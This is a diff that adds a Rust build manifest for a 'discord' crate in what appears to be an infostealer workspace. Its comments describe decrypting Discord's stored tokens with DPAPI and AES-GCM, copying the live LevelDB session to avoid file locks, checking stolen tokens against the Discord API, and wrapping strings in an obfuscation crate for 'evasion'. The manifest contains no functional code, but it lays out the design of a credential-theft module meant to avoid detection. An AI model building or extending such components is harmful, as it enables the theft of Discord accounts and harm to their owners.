@@ -1,0 +1,22 @@
+[package]
+name = "discord"
+version.workspace = true
+edition.workspace = true
+license.workspace = true
+
+[dependencies]
+hbd_core = { path = "../core" }
+# DPAPI + AES-GCM decrypt key reuse (Discord app = Electron = Chromium crypto).
+hbd_crypto = { path = "../crypto", package = "crypto" }
+# LevelDB reader + Session copy (avoid exclusive-lock reads on live Discord).
+browser = { path = "../browser" }
+filemanager = { path = "../filemanager" }
+# WinHTTP HTTPS client (token validation probe against the Discord API).
+abi = { path = "../abi" }
+# Wave 3/4 evasion wraps (obfstr), same as the rest of the workspace.
+bypass = { path = "../bypass" }
+regex = { workspace = true }
+base64 = { workspace = true }
+serde_json = { workspace = true }
+serde = { workspace = true }
+log = { workspace = true }
